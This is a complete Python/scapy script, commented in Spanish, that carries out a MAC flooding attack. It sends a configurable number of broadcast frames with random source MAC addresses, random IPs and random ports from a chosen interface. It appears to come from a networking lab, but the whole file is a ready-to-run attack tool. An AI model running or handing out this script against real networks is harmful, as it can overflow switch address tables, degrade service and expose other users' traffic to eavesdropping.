#!/usr/bin/env python3
"""Genera tramas Ethernet con MACs de origen aleatorias (MAC flooding).

Uso: sudo python3 mac-flood.py --iface enp0s10 --count 500
"""
import argparse
import random
from scapy.all import Ether, IP, UDP, RandIP, RandShort, sendp

p = argparse.ArgumentParser()
p.add_argument("--iface", default="enp0s10")
p.add_argument("--count", type=int, default=500)
a = p.parse_args()

def unicast_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randrange(256) for _ in range(5))

for _ in range(a.count):
    pkt = (
        Ether(src=unicast_mac(), dst="ff:ff:ff:ff:ff:ff")
        / IP(src=RandIP(), dst=RandIP())
        / UDP(sport=RandShort(), dport=RandShort())
    )
    sendp(pkt, iface=a.iface, verbose=False)
print(f"Enviadas {a.count} tramas con MAC de origen aleatoria por {a.iface}")
